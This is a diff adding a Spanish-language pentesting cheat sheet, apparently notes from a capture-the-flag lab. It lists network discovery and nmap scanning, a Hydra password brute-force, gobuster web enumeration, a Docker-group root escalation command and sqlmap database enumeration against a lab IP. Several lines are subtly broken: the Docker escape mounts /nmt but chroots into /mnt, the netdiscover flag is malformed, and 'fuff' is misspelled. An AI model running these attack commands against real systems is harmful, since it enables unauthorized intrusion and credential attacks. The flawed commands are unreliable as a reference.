@@ -1,0 +1,29 @@
+Ruta diccionarios > /usr/share/wordlists/
+
+arp-scan -l   > escanear todas las IP de la red
+
+netdiscover /r @ red/24
+
+nmap -p- --open --min-rate 5000 -sSCV -n -Pn IP-MAQUINA -vvv -oN resultados.txt
+
+
+Para webs > gobuster , fuff, 
+
+Hydra >  hydra -l user -P diccionario ip-maquina
+
+gobuster dir -u direccion-web -t 20 -w path-diccionario -x .html
+
+sudo -u jerry ./ejecutable.sh
+
+id > muestra los permisos que tiene el usuario
+
+Para explotar la vulnerabilidad: docker run -v /:/nmt --rm -it alpine chroot /mnt bash
+
+
+Buscar bbdd > sqlmap -u http://10.20.30.10:80/mercuryfacts/ --dbs --batch
+
+--dbs > es para que nos busque bases de datos 
+
+information_schema > no se le hace caso, es la configuracion del motor
+
+
